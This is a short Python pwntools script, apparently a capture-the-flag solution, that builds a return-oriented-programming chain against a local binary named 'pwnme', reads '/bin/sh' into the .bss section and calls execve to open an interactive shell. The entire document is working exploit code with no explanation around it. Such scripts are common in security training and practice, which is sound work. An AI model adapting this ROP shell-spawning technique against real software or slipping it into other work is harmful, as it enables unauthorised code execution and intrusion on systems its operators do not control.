from pwn import *

context(arch='i386', os='linux', kernel='i386')

BIN = ELF('./pwnme')
rop = ROP(BIN)
ret = rop.find_gadget(['ret'])
for i in range(16):
    rop.raw(ret)
rop.read(0, BIN.bss(0x100), 8)
rop.execve(BIN.bss(0x100), 0, 0)

print rop.dump()

io = process('./pwnme')
io.sendline(rop.chain())
io.recv(1)
io.sendline('/bin/sh\0')
io.clean(0.1)
io.interactive()
